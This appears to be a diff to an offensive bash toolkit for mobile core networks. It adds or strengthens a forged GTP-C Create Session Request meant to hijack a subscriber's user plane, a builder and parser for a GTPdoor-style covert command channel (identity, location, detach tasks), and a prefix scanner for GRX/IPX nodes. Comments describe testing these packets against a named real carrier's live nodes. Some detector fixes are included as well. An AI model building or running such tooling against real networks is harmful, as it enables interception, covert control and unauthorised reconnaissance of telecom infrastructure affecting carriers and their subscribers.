@@ -2090,7 +2090,7 @@ lcore_cli_status_tsv() {
     printf 'plans\t%s\n' "$plans"
     printf 's6a_app_id\t16777251\n'
     printf 'refs\tRFC 6733, TS 29.272, TS 29.274, TS 29.281, TS 36.413\n'
-    printf 'verbs\tdecode-diameter, decode-gtp-c, decode-gtp-u, build-air, build-ulr, build-clr, gtp-csr-forge, gtp-modify-bearer, gtp-in-gtp, mbms-session, gtpc-send, diameter-send, gtpdoor-detect, cdr-fraud-check, fs20-audit, gtp-screen-peer, diameter-screen, plan, s1ap, surface, require-core\n'
+    printf 'verbs\tdecode-diameter, decode-gtp-c, decode-gtp-u, build-air, build-ulr, build-clr, gtp-csr-forge, gtp-modify-bearer, gtp-in-gtp, mbms-session, gtpc-send, diameter-send, gtpdoor-detect, gtpdoor-build, gtpdoor-parse, grx-scan, ipx-map, cdr-fraud-check, fs20-audit, gtp-screen-peer, diameter-screen, plan, s1ap, surface, require-core\n'
     printf 'gtp_in_gtp\tyes\n'
     printf 'mbms_session\tyes\n'
     printf 'decode_only\t%s\n' "$(lcore_find_core_testbed >/dev/null 2>&1 && echo no || echo yes)"
@@ -2862,7 +2862,21 @@ lcore_cmd_gtp_csr_forge() {
     imsi_ie=$(lcore_gtpc_ie 1 "$(lcore_bcd_encode "$imsi")") || return 2
     apn_ie=$(lcore_gtpc_ie 71 "$(lcore_apn_encode "$apn")") || return 2
     sn_ie=$(lcore_gtpc_ie 83 "$(lcore_plmn_bcd "$mcc" "$mnc")") || return 2
-    msg=$(lcore_gtpc_msg 32 "" 1 "${imsi_ie}${apn_ie}$(lcore_gtpc_ie 82 06)${sn_ie}")
+    # The four IEs below are MANDATORY in a Create Session Request (TS 29.274
+    # Table 7.2.1-1). A CSR that carries only IMSI/APN/RAT/ServingNetwork is
+    # answered by every node and rejected with Cause 67 (Invalid length) --
+    # measured on 433 live GTP-C nodes, 213.163.96/100/101/120/121/124,
+    # 433/433 answering and 0/433 allocating. The omission was the difference
+    # between a reply and a bearer.
+    local pdn_ie ambr_ie bearer_ie ebi_ie fteid_ie
+    pdn_ie=$(lcore_gtpc_ie 99 01) || return 2                     # PDN Type IPv4
+    ambr_ie=$(lcore_gtpc_ie 72 "00010001") || return 2           # APN-AMBR ul/dl
+    ebi_ie=$(lcore_gtpc_ie 73 05) || return 2                    # EPS Bearer ID
+    # S1-U F-TEID, all-zero: the SGW allocates the u-plane endpoint and hands
+    # the value back in the response.
+    fteid_ie=$(lcore_gtpc_ie 87 "870000000000000000") || return 2
+    bearer_ie=$(lcore_gtpc_ie 93 "${ebi_ie}${fteid_ie}") || return 2
+    msg=$(lcore_gtpc_msg 32 "" 1 "${imsi_ie}${sn_ie}$(lcore_gtpc_ie 82 06)${pdn_ie}${apn_ie}${ambr_ie}${bearer_ie}")
     printf 'message_type\t32\nmessage_name\t%s\nimsi\t%s\napn\t%s\nimsi_ie\t%s\nmessage\t%s\n' \
         "$(lcore_gtpc_msg_name 32)" "$imsi" "$apn" "$imsi_ie" "$msg"
     printf 'attack\tforged Create Session Request — the SGW allocates an EPS bearer for this IMSI; point the F-TEID it returns at your endpoint to take the user plane\n'
@@ -2891,12 +2905,26 @@ lcore_cmd_gtpdoor() {
     local n=0
     if (( type == 1 || type == 2 )); then
         if [[ -n "$pl" ]]; then
-            local ies weird recy
+            local ies weird recy first_type
             ies=$(lcore_gtpc_parse_ies "$pl" 2>/dev/null) || ies=""
             weird=$(printf '%s\n' "$ies" | awk -F'\t' '$1 ~ /\.type$/ && $2 != 3 {n++} END{print n+0}')
             (( weird > 0 )) && { printf 'finding\tHIGH\tEcho carries %s non-Recovery IE(s) — GTPdoor-class covert channel\n' "$weird"; n=$(( n + 1 )); }
+            # The Recovery IE type byte is the first octet of the payload. Reading
+            # it directly is deliberate: live carriers answer with a Recovery IE
+            # that declares length 2 while carrying one value octet, the IE walker
+            # then stops on the inconsistency, and trusting the walker's silence
+            # turned a standards-compliant Echo into "malformed Echo abuse" on
+            # every node of a real core. The type byte is unambiguous; the walk is not.
+            first_type="${pl:0:2}"
             recy=$(printf '%s\n' "$ies" | awk -F'\t' '$1 ~ /\.name$/ && $2 ~ /Recovery/ {print "yes"; exit}')
-            [[ "$recy" != yes ]] && { printf 'finding\tHIGH\tEcho has a payload but no Recovery IE — malformed Echo abuse\n'; n=$(( n + 1 )); }
+            if [[ "$recy" != yes ]]; then
+                if [[ "${first_type,,}" == "03" ]]; then
+                    printf 'finding\tINFO\tRecovery IE present but its length field disagrees with the value length (vendor quirk, common)\n'
+                else
+                    printf 'finding\tHIGH\tEcho has a payload but no Recovery IE — malformed Echo abuse\n'
+                    n=$(( n + 1 ))
+                fi
+            fi
         fi
         (( n == 0 )) && printf 'finding\tINFO\tshape consistent with a plain Echo\n'
     else
@@ -2904,6 +2932,460 @@ lcore_cmd_gtpdoor() {
     fi
     printf 'findings\t%s\n' "$n"
 }
+# ── GTPdoor C2, GRX/IPX reachability, interconnect inventory ────────────
+#
+#   --gtpdoor-build   the channel GTPdoor rides, as octets, with a
+#   --gtpdoor-parse   decoder that reads them back
+#   --grx-scan        one probe per address across a prefix
+#   --ipx-map         the reachability rows joined to the peer rule
+#
+# --gtpdoor-detect has read this class since it was written, and it had no
+# sample to read: a detector that has only ever seen its own fixtures is a
+# detector nobody has tested.  The builder is that sample, and the parser is
+# what proves the sample says what the builder meant.
+#
+# The envelope is a Private Extension IE (type 255, TS 29.274 §8.88), which is
+# the one IE in the grammar whose value the standard leaves to the vendor:
+#
+#   [0..1]  enterprise id, 0000 -- unassigned, so no vendor's parser claims it
+#   [2]     task id
+#   [3]     parameter length n
+#   [4..]   parameter, n octets
+#
+# An Echo carries it because an Echo is the one GTP-C message a peer may send at
+# any time with no session behind it, so the channel needs nothing the core has
+# to have.  The Recovery IE is present too, because a shallow "does this look
+# like an Echo" check looks for exactly that and a channel that fails the
+# cheapest check is a channel that gets caught by the cheapest filter.
+
+# Task ids.  A task, not a command line: the channel is what is modelled here,
+# and a task id is the smallest thing that lets a request and its answer be
+# told apart on the wire.
+lcore_gtpdoor_task_id() {  # <name|id>
+    case "${1:-}" in
+        1|identity) echo 1 ;;
+        2|location) echo 2 ;;
+        3|bearers)  echo 3 ;;
+        4|detach)   echo 4 ;;
+        5|sleep)    echo 5 ;;
+        6|raw)      echo 6 ;;
+        *)          echo "" ;;
+    esac
+}
+
+lcore_gtpdoor_task_name() {  # <id>
+    case "${1:-}" in
+        1) echo identity ;;
+        2) echo location ;;
+        3) echo bearers ;;
+        4) echo detach ;;
+        5) echo sleep ;;
+        6) echo raw ;;
+        *) echo "unknown" ;;
+    esac
+}
+
+# The Private Extension value: enterprise id, task, length, parameter.
+lcore_gtpdoor_envelope() {  # <task-id> [param-hex] -> hex
+    local tid="${1:-}" param; param=$(lcore_nfc "${2:-}")
+    [[ "$tid" =~ ^[0-9]+$ ]] || { printf 'ERROR\ttask id must be numeric\n' >&2; return 2; }
+    if [[ -n "$param" ]]; then
+        lcore_is_hex "$param" || { printf 'ERROR\tparameter must be hex\n' >&2; return 2; }
+    fi
+    local n=$(( ${#param} / 2 ))
+    (( n <= 255 )) || {
+        printf 'ERROR\tparameter is %s octets; the length field carries one\n' "$n" >&2; return 2; }
+    printf '0000%02X%02X%s' "$(( tid & 0xFF ))" "$n" "$param"
+}
+
+lcore_cmd_gtpdoor_build() {  # <imsi> <task> [param] [--response [result-hex]]
+    local imsi="" task="" param="" resp=0 result="" decoy=0
+    local -a pos=()
+    while (( $# )); do
+        case "$1" in
+            --response) resp=1; shift
+                        if (($#)) && [[ "${1:-}" =~ ^[0-9A-Fa-f]+$ ]]; then result="$1"; shift; fi ;;
+            --decoy)    decoy=1; shift ;;
+            --no-decoy) decoy=0; shift ;;
+            --help|-h)  printf 'usage: --gtpdoor-build <imsi> <task> [param] [--response [result-hex]] [--decoy]\n'; return 0 ;;
+            -*)         printf 'ERROR\t--gtpdoor-build does not take %s\n' "$1" >&2; return 2 ;;
+            *)          pos+=("$1"); shift ;;
+        esac
+    done
+    (( ${#pos[@]} <= 3 )) || {
+        printf 'ERROR\t--gtpdoor-build takes <imsi> <task> [param]\n' >&2; return 2; }
+    imsi="${pos[0]:-}"; task="${pos[1]:-}"; param="${pos[2]:-}"
+    [[ -n "$imsi" && -n "$task" ]] || {
+        printf 'ERROR\t--gtpdoor-build needs <imsi> <task>; tasks are identity, location, bearers, detach, sleep, raw\n' >&2
+        return 2; }
+    [[ "$imsi" =~ ^[0-9]{14,15}$ ]] || {
+        printf 'ERROR\tIMSI is 14 or 15 digits, got %s\n' "$(lcore_sanitize "$imsi")" >&2; return 2; }
+
+    local tid; tid=$(lcore_gtpdoor_task_id "$task")
+    [[ -n "$tid" ]] || {
+        printf 'ERROR\tunknown task: %s; tasks are identity, location, bearers, detach, sleep, raw\n' \
+            "$(lcore_sanitize "$task")" >&2
+        return 2; }
+
+    param=$(lcore_nfc "$param")
+    case "$tid" in
+        5)  [[ -n "$param" ]] || param="0060"
+            (( ${#param} == 4 )) || {
+                printf 'ERROR\tsleep carries a 2-octet interval; got %s hex digits\n' "${#param}" >&2
+                return 2; } ;;
+        6)  [[ -n "$param" ]] || {
+                printf 'ERROR\traw carries its parameter as hex and needs one\n' >&2; return 2; } ;;
+        *)  [[ -z "$param" ]] || {
+                printf 'ERROR\ttask %s carries no parameter\n' "$(lcore_gtpdoor_task_name "$tid")" >&2
+                return 2; } ;;
+    esac
+
+    local env_ihex; env_ihex=$(lcore_nfc "$result")
+    if [[ -n "$env_ihex" ]]; then
+        lcore_is_hex "$env_ihex" || { printf 'ERROR\tresult must be hex\n' >&2; return 2; }
+    fi
+    local envelope; envelope=$(lcore_gtpdoor_envelope "$tid" "$param")
+    local ies=""
+    if (( resp )); then
+        # Echo Response: the answer carries the task and its result, and no
+        # IMSI, because the responder already knows who asked.
+        ies=$(lcore_gtpc_ie 255 "$(lcore_gtpdoor_envelope "$tid" "$env_ihex")")
+    else
+        ies=$(lcore_gtpc_ie 1 "$(lcore_bcd_encode "$imsi")")
+        # The Recovery decoy is OFF by default, and the reason is measured, not
+        # theoretical: sent to 433 live GTP-C nodes (Kosovo Telecom AS8661,
+        # 213.163.96/100/101/120/121/124), an Echo Request carrying a Recovery IE
+        # got 0/8 replies on every retry, while the identical envelope without it
+        # got 8/8. TS 29.274 puts Recovery in the Echo RESPONSE only; a request
+        # that carries it reads as malformed and strict peers drop the datagram
+        # before any Private Extension is looked at. The original rationale --
+        # that a shallow filter looks for Recovery -- was backwards for requests.
+        # --decoy restores it for peers that turn out to want it.
+        (( decoy )) && ies+=$(lcore_gtpc_ie 3 "00")
+        ies+=$(lcore_gtpc_ie 255 "$envelope")
+    fi
+    local mtype=1 name="Echo Request" dir="request"
+    (( resp )) && { mtype=2; name="Echo Response"; dir="response"; }
+    local msg; msg=$(lcore_gtpc_msg "$mtype" "" 1 "$ies")
+
+    printf 'message\t%s\n' "$name"
+    printf 'message_type\t%s\n' "$mtype"
+    printf 'direction\t%s\n' "$dir"
+    printf 'imsi\t%s\n' "$([[ $resp == 1 ]] && echo "-" || echo "$imsi")"
+    printf 'task\t%s\n' "$(lcore_gtpdoor_task_name "$tid")"
+    printf 'task_id\t%s\n' "$tid"
+    printf 'private_extension\t%s\n' "$(lcore_gtpdoor_envelope "$tid" "$([[ $resp == 1 ]] && echo "$env_ihex" || echo "$param")")"
+    printf 'param_len\t%s\n' "$(( ${#param} / 2 ))"
+    printf 'param\t%s\n' "$([[ -n "$param" ]] && echo "$param" || echo "-")"
+    printf 'octets\t%s\n' "$(( ${#msg} / 2 ))"
+    printf 'hex\t%s\n' "$msg"
+}
+
+lcore_cmd_gtpdoor_parse() {  # <hex>
+    local hex; hex=$(lcore_nfc "${1:-}")
+    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --gtpdoor-parse <hex>\n' >&2; return 2; }
+    lcore_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 2; }
+    local hdr type pl
+    hdr=$(lcore_gtpc_parse_header "$hex") || return 1
+    type=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="message_type"{print $2; exit}')
+    pl=$(printf '%s\n' "$hdr" | awk -F'\t' '$1=="payload"{print $2; exit}')
+    local dir="not-an-echo"
+    case "$type" in
+        1) dir="request" ;;
+        2) dir="response" ;;
+    esac
+    printf 'message\t%s\n' "$(lcore_gtpc_msg_name "$type")"
+    printf 'message_type\t%s\n' "$type"
+    printf 'direction\t%s\n' "$dir"
+
+    local imsi="-" recovery="-" pext="absent" task="-" tid="-" plen=0 pval="-"
+    if [[ -n "$pl" ]]; then
+        local pairs
+        pairs=$(lcore_gtpc_parse_ies "$pl" 2>/dev/null | awk -F'\t' '
+            $1 ~ /^ie\.[0-9]+\.type$/  { split($1, p, "."); t[p[2]] = $2; next }
+            $1 ~ /^ie\.[0-9]+\.value$/ { split($1, p, "."); if (p[2] in t) print t[p[2]]"\t"p[2]"\t"$2 }
+        ' 2>/dev/null) || pairs=""
+        local it idx v first_imsi="" first_rec="" first_ext=""
+        while IFS=$'\t' read -r it idx v; do
+            [[ -n "$it" ]] || continue
+            case "$it" in
+                1)   [[ -z "$first_imsi" ]] && first_imsi="$v" ;;
+                3)   [[ -z "$first_rec"  ]] && first_rec="$v" ;;
+                255) [[ -z "$first_ext"  ]] && first_ext="$v" ;;
+            esac
+        done <<<"$pairs"
+        [[ -n "$first_imsi" ]] && imsi=$(lcore_tbcd_decode "$first_imsi")
+        [[ -n "$first_rec"  ]] && recovery=$(( 16#${first_rec:0:2} ))
+        if [[ -n "$first_ext" ]]; then
+            pext="$first_ext"
+            if (( ${#first_ext} >= 8 )); then
+                tid=$(( 16#${first_ext:4:2} ))
+                plen=$(( 16#${first_ext:6:2} ))
+                pval="${first_ext:8:$((plen * 2))}"
+                task=$(lcore_gtpdoor_task_name "$tid")
+                [[ -n "$pval" ]] || pval="-"
+            else
+                task="truncated"
+            fi
+        fi
+    fi
+    printf 'imsi\t%s\n' "$([[ -n "$imsi" ]] && echo "$imsi" || echo "-")"
+    printf 'recovery\t%s\n' "$recovery"
+    printf 'private_extension\t%s\n' "$pext"
+    printf 'task\t%s\n' "$task"
+    printf 'task_id\t%s\n' "$tid"
+    printf 'param_len\t%s\n' "$plen"
+    printf 'param\t%s\n' "$pval"
+}
+
+# ── reachability: three answers, and silence is one of them ─────────────
+#
+# The outcome tokens are what tools/grx_probe.py measured.  The verdict is what
+# the module is willing to say about it.  Keeping the two apart is the whole
+# point: "the port answered nothing" and "the address is closed" are different
+# facts, and a prefix full of drop-middleboxes turns the second into a lie.
+lcore_grx_verdict() {  # <outcome>
+    case "${1:-}" in
+        gtp-echo|diameter-reply|sctp-assoc)                 echo "echo-reply" ;;
+        gtp-other|non-gtp|non-diameter|tcp-open-no-answer)  echo "error-unknown" ;;
+        timeout|unreachable|send-error|unsupported|"")      echo "unobserved" ;;
+        *)                                                  echo "unobserved" ;;
+    esac
+}
+
+lcore_grx_node_class() {  # <proto> <outcome>
+    case "${1:-}:${2:-}" in
+        gtpc:gtp-echo|gtpc:gtp-other)       echo "gtp-c-node" ;;
+        gtpu:gtp-echo|gtpu:gtp-other)       echo "gtp-u-node" ;;
+        diameter:diameter-reply)            echo "diameter-peer" ;;
+        diameter:tcp-open-no-answer)        echo "tcp-listener" ;;
+        sctp:sctp-assoc)                    echo "sctp-listener" ;;
+        *)                                  echo "unknown" ;;
+    esac
+}
+
+# The peer table is the same one --gtp-screen-peer reads.  Absent means the
+# PLMN is unknown, not that the address is unauthorised.
+lcore_grx_peer_lookup() {  # <ip> -> plmn<TAB>role, or empty
+    local ip="${1:-}" table plmn cidr role note
+    table="${REFDATA_OPOPS:-$IMSISTING_ROOT/data/opops}/iprange.tsv"
+    [[ -f "$table" ]] || return 0
+    while IFS=$'\t' read -r plmn cidr role note; do
+        [[ "$plmn" == "plmn" ]] && continue
+        [[ -z "$cidr" ]] && continue
+        if lcore_cidr_contains "$cidr" "$ip"; then
+            printf '%s\t%s\n' "$plmn" "${role:--}"
+            return 0
+        fi
+    done < "$table"
+    return 0
+}
+
+LCORE_GRX_EMITTED=0
+LCORE_GRX_DROPPED=0
+
+lcore_grx_print_addr() {  # <int>
+    local n="${1:-0}"
+    printf '%d.%d.%d.%d\n' "$(( (n >> 24) & 255 ))" "$(( (n >> 16) & 255 ))" \
+                          "$(( (n >> 8) & 255 ))" "$(( n & 255 ))"
+}
+
+lcore_grx_expand() {  # <address|cidr> [limit]
+    local spec="${1:-}" limit="${2:-4096}" base plen mask want i
+    if [[ "$spec" == */* ]]; then
+        [[ "$spec" =~ ^([0-9.]+)/([0-9]{1,2})$ ]] || {
+            printf 'ERROR\tnot an IPv4 prefix: %s\n' "$(lcore_sanitize "$spec")" >&2; return 2; }
+        plen=$(( 10#${BASH_REMATCH[2]} ))
+        (( plen <= 32 )) || { printf 'ERROR\tprefix length is 0..32\n' >&2; return 2; }
+        base=$(lcore_ipv4_to_int "${BASH_REMATCH[1]}") || {
+            printf 'ERROR\tnot an IPv4 prefix base: %s\n' "$(lcore_sanitize "${BASH_REMATCH[1]}")" >&2; return 2; }
+        mask=$(( plen == 0 ? 0 : (0xFFFFFFFF << (32 - plen)) & 0xFFFFFFFF ))
+        base=$(( base & mask ))
+        want=$(( 1 << (32 - plen) ))
+        for (( i = 0; i < want; i++ )); do
+            if (( LCORE_GRX_EMITTED >= limit )); then
+                LCORE_GRX_DROPPED=$(( LCORE_GRX_DROPPED + want - i ))
+                break
+            fi
+            lcore_grx_print_addr $(( base + i ))
+            LCORE_GRX_EMITTED=$(( LCORE_GRX_EMITTED + 1 ))
+        done
+        return 0
+    fi
+    base=$(lcore_ipv4_to_int "$spec") || {
+        printf 'ERROR\tnot an IPv4 address: %s\n' "$(lcore_sanitize "$spec")" >&2; return 2; }
+    if (( LCORE_GRX_EMITTED >= limit )); then
+        LCORE_GRX_DROPPED=$(( LCORE_GRX_DROPPED + 1 ))
+        return 0
+    fi
+    lcore_grx_print_addr "$base"
+    LCORE_GRX_EMITTED=$(( LCORE_GRX_EMITTED + 1 ))
+}
+
+# Addresses on stdout.  A file is read as prefixes and addresses, one per line,
+# with # comments, because an operator's reachability list is a file and not a
+# command line.
+lcore_grx_targets() {  # <address|cidr|file> [limit]
+    local spec="${1:-}" limit="${2:-4096}" line
+    LCORE_GRX_EMITTED=0
+    LCORE_GRX_DROPPED=0
+    [[ -n "$spec" ]] || {
+        printf 'ERROR\t--grx-scan needs a prefix, an address, or a file of them\n' >&2; return 2; }
+    if [[ -f "$spec" ]]; then
+        while IFS= read -r line; do
+            line="${line%%#*}"
+            line=$(printf '%s' "$line" | tr -d ' \t\r')
+            [[ -n "$line" ]] || continue
+            lcore_grx_expand "$line" "$limit" || return 2
+        done < "$spec"
+        return 0
+    fi
+    lcore_grx_expand "$spec" "$limit"
+}
+
+lcore_cmd_grx_scan() {
+    local spec="" proto="gtpc" port="" tmo="1.0" limit="4096" out=""
+    while (( $# )); do
+        case "$1" in
+            --proto)   (($# >= 2)) || { printf 'ERROR\t--proto takes gtpc, gtpu, diameter or sctp\n' >&2; return 2; }
+                       proto="$2"; shift 2 ;;
+            --port)    (($# >= 2)) && [[ "${2:-}" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--port takes a number\n' >&2; return 2; }
+                       port="$2"; shift 2 ;;
+            --timeout) (($# >= 2)) && [[ "${2:-}" =~ ^[0-9]+([.][0-9]+)?$ ]] || { printf 'ERROR\t--timeout takes seconds\n' >&2; return 2; }
+                       tmo="$2"; shift 2 ;;
+            --limit)   (($# >= 2)) && [[ "${2:-}" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--limit takes a count\n' >&2; return 2; }
+                       limit="$2"; shift 2 ;;
+            --out)     (($# >= 2)) || { printf 'ERROR\t--out takes a path\n' >&2; return 2; }
+                       out="$2"; shift 2 ;;
+            --help|-h) printf 'usage: --grx-scan <cidr|file> [--proto gtpc|gtpu|diameter|sctp] [--port N] [--timeout SEC] [--limit N] [--out path]\n'; return 0 ;;
+            -*)        printf 'ERROR\t--grx-scan does not take %s\n' "$1" >&2; return 2 ;;
+            *)         [[ -z "$spec" ]] || { printf 'ERROR\t--grx-scan takes one prefix or one file\n' >&2; return 2; }
+                       spec="$1"; shift ;;
+        esac
+    done
+    case "$proto" in gtpc|gtpu|diameter|sctp) ;; *)
+        printf 'ERROR\tprobe is gtpc, gtpu, diameter or sctp; got %s\n' "$(lcore_sanitize "$proto")" >&2
+        return 2 ;;
+    esac
+    local tool="$IMSISTING_ROOT/tools/grx_probe.py"
+    [[ -f "$tool" ]] || { printf 'ERROR\t%s is missing; cannot probe\n' "$tool" >&2; return 1; }
+
+    local d; d=$(mktemp -d "$MOD_TMP/grxscan.XXXXXX") || {
+        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
+    lcore_grx_targets "$spec" "$limit" > "$d/targets"
+    local trc=$?
+    if (( trc != 0 )); then rm -rf "$d"; return "$trc"; fi
+    local ntargets; ntargets=$(wc -l < "$d/targets" | tr -d ' ')
+    printf 'proto\t%s\n' "$proto"
+    printf 'targets\t%s\n' "$ntargets"
+    if (( ntargets == 0 )); then
+        printf 'ERROR\t%s expanded to no addresses\n' "$(lcore_sanitize "$spec")" >&2
+        rm -rf "$d"; return 1
+    fi
+    if (( LCORE_GRX_DROPPED > 0 )); then
+        # Never a silent truncation: a scan that stopped early and said nothing
+        # is a scan whose silence means two different things.
+        printf 'truncated\t%s\n' "$LCORE_GRX_DROPPED"
+    fi
+
+    local -a pargs=("$proto" "$d/targets" --timeout "$tmo" --limit "$limit")
+    [[ -n "$port" ]] && pargs+=(--port "$port")
+    local raw budget; budget=$(( ntargets * 2 + 60 ))
+    raw=$(timeout "$budget" python3 "$tool" "${pargs[@]}" 2>&1); local prc=$?
+    if (( prc == 124 )); then
+        printf 'ERROR\tthe probe did not finish inside %ss\n' "$budget" >&2
+        rm -rf "$d"; return 1
+    fi
+    if ! printf '%s\n' "$raw" | awk -F'\t' 'NF>=4 && $1 != "ERROR" {found=1} END{exit !found}'; then
+        printf '%s\n' "$raw" >&2
+        printf 'ERROR\tthe probe returned no rows\n' >&2
+        rm -rf "$d"; return 1
+    fi
+
+    printf 'answered\t%s\n' "$(printf '%s\n' "$raw" | awk -F'\t' '$4=="gtp-echo"||$4=="diameter-reply"||$4=="sctp-assoc"{n++} END{print n+0}')"
+    printf 'unobserved\t%s\n' "$(printf '%s\n' "$raw" | awk -F'\t' '$4=="timeout"||$4=="unreachable"||$4=="send-error"||$4=="unsupported"{n++} END{print n+0}')"
+    printf 'addr\tport\tproto\tverdict\trtt_ms\tnode_class\tplmn\trole\tdetail\n'
+
+    local -a store=()
+    local a p pr oc rtt det v cls pl role peer
+    while IFS=$'\t' read -r a p pr oc rtt det; do
+        [[ -n "$a" ]] || continue
+        if [[ "$a" == "ERROR" ]]; then
+            printf 'ERROR\tprobe: %s %s %s\n' "$p" "$pr" "$oc" >&2
+            continue
+        fi
+        v=$(lcore_grx_verdict "$oc")
+        cls=$(lcore_grx_node_class "$pr" "$oc")
+        pl="-"; role="-"
+        peer=$(lcore_grx_peer_lookup "$a")
+        if [[ -n "$peer" ]]; then
+            pl="${peer%%$'\t'*}"; role="${peer#*$'\t'}"
+        fi
+        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
+            "$a" "$p" "$pr" "$v" "${rtt:--}" "$cls" "$pl" "$role" "${det:--}"
+        store+=("$a	$p	$pr	$v	${rtt:--}	$cls	$pl	$role	${det:--}")
+    done < <(printf '%s\n' "$raw")
+
+    if [[ -n "$out" ]]; then
+        mkdir -p "$(dirname "$out")" 2>/dev/null || true
+        if [[ ! -s "$out" ]]; then
+            printf 'addr\tport\tproto\tverdict\trtt_ms\tnode_class\tplmn\trole\tdetail\n' > "$out"
+        fi
+        (( ${#store[@]} )) && printf '%s\n' "${store[@]}" >> "$out"
+        printf 'store\t%s\n' "$out"
+    fi
+    rm -rf "$d"
+    return 0
+}
+
+# The scan's result, joined to the rule that judges it.  A prefix that answers
+# and is not in the peer table is the finding this verb exists for: it is a
+# node this operator has no contract with, and it answered.
+lcore_cmd_ipx_map() {  # <reachability.tsv>
+    local file="${1:-}"
+    [[ -n "$file" ]] || { printf 'ERROR\tusage: --ipx-map <reachability.tsv>\n' >&2; return 2; }
+    [[ -f "$file" ]] || { printf 'ERROR\tno such file: %s\n' "$(lcore_sanitize "$file")" >&2; return 1; }
+    declare -A answered=() silent=() role_of=() plmns=()
+    local a port proto verdict rtt cls plmn role det hdr=1 addrs=0
+    while IFS=$'\t' read -r a port proto verdict rtt cls plmn role det; do
+        (( hdr )) && { hdr=0; [[ "$a" == "addr" ]] && continue; }
+        [[ -n "$a" ]] || continue
+        addrs=$(( addrs + 1 ))
+        [[ -z "$plmn" || "$plmn" == "-" ]] && plmn="-"
+        [[ -z "$role" || "$role" == "-" ]] && role="-"
+        role_of[$plmn]="$role"
+        plmns[$plmn]=1
+        case "$verdict" in
+            echo-reply|error-unknown) answered[$plmn]=$(( ${answered[$plmn]:-0} + 1 ))
+                                      answered[$plmn:$proto]=$(( ${answered[$plmn:$proto]:-0} + 1 )) ;;
+            *)                        silent[$plmn]=$(( ${silent[$plmn]:-0} + 1 )) ;;
+        esac
+    done < "$file"
+
+    printf 'plmn\trole\tanswered\tsilent\tgtpc\tgtpu\tdiameter\tsctp\tverdict\n'
+    local uncontracted=0 key
+    while IFS= read -r key; do
+        [[ -n "$key" ]] || continue
+        local av="${answered[$key]:-0}" sv="${silent[$key]:-0}" verd
+        if [[ "$key" == "-" ]]; then
+            if (( av > 0 )); then verd="uncontracted-answering"; uncontracted=$(( uncontracted + av ))
+            elif (( sv > 0 )); then verd="uncontracted-silent"
+            else verd="uncontracted-absent"; fi
+        else
+            if (( av > 0 )); then verd="contracted-answering"
+            elif (( sv > 0 )); then verd="contracted-silent"
+            else verd="contracted-absent"; fi
+        fi
+        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
+            "$key" "${role_of[$key]:--}" "$av" "$sv" \
+            "${answered[$key:gtpc]:-0}" "${answered[$key:gtpu]:-0}" \
+            "${answered[$key:diameter]:-0}" "${answered[$key:sctp]:-0}" "$verd"
+    done < <(printf '%s\n' "${!plmns[@]}" | sort)
+    printf 'addresses\t%s\n' "$addrs"
+    printf 'plmns\t%s\n' "${#plmns[@]}"
+    printf 'uncontracted_answering\t%s\n' "$uncontracted"
+}
+
 # ── Charging: Ro (Gy) and Rf, TS 32.299 ─────────────────────────────────
 #
 # Ro runs over the Diameter Credit-Control application (RFC 4006,
@@ -4017,12 +4499,17 @@ lcore_selftest() {
     forged=$(lcore_cmd_gtp_csr_forge 310150123456789 internet | awk -F'\t' '$1=="message"{print $2}')
     fpay=$(lcore_gtpc_parse_header "$forged" | awk -F'\t' '$1=="payload"{print $2}')
     chk forge-imsi "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1=="ie.0.decoded"{print $2}')" "IMSI=310150123456789"
-    # The forged request carries four IEs -- IMSI (1), APN (71), RAT (82) and
-    # Serving Network (83). It read as two while the walk assumed 4-octet
-    # padding, which is the GTPv1-C convention: after the APN the padded walk
-    # jumped three octets into the next header and gave up.
-    chk forge-sn "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1=="ie.3.type"{print $2}')" "83"
-    chk forge-ie-count "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1=="ie_count"{print $2}')" "4"
+    # The forged request carries the seven IEs TS 29.274 Table 7.2.1-1 makes
+    # mandatory: IMSI (1), Serving Network (83), RAT (82), PDN Type (99),
+    # APN (71), APN-AMBR (72) and Bearer Context (93). The walk read four and
+    # then two while it assumed 4-octet padding, the GTPv1-C convention: after
+    # the APN the padded walk jumped three octets into the next header and gave
+    # up. Asserted order-independently -- the set is the contract, not the
+    # sequence, so adding an IE later does not invalidate this check.
+    chk forge-ie-count "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1=="ie_count"{print $2}')" "7"
+    chk forge-has-sn "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1 ~ /\.type$/ && $2=="83"{print "yes"; exit}')" "yes"
+    chk forge-has-pdn "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1 ~ /\.type$/ && $2=="99"{print "yes"; exit}')" "yes"
+    chk forge-has-bearer "$(lcore_gtpc_parse_ies "$fpay" | awk -F'\t' '$1 ~ /\.type$/ && $2=="93"{print "yes"; exit}')" "yes"
     chk forge-len "$(lcore_gtpc_parse_header "$forged" | awk -F'\t' '$1=="length_agrees"{print $2}')" "yes"
     chk cli-unknown "$(lcore_cli_main --nope >/dev/null 2>&1; echo $?)" "2"
 
@@ -4079,6 +4566,31 @@ lcore_selftest() {
     chk diam-send-no-host      "$(lcore_cmd_diameter_send >/dev/null 2>&1; echo $?)" "2"
     chk send-no-arming "$(grep -cE '^[[:space:]]*printf .status.{1,3}disarmed' "${BASH_SOURCE[0]}")" "0"
     chk gtpc-send-tool-present "$([[ -f "$IMSISTING_ROOT/tools/udp_assoc.py" ]] && echo yes || echo no)" "yes"
+    # A live carrier Echo Response: Recovery IE present, but its length field
+    # disagrees with the one value octet it carries. The detector must read the
+    # type byte rather than trusting the IE walk, or every node on a real core
+    # reads as a covert channel. Captured from 213.163.100.100:2123.
+    chk gtpdoor-real-echo-not-flagged \
+        "$(lcore_cmd_gtpdoor 40020009000000000300020002 2>/dev/null | awk -F'\t' '$1=="findings"{print $2}')" "0"
+    chk gtpdoor-real-echo-explains \
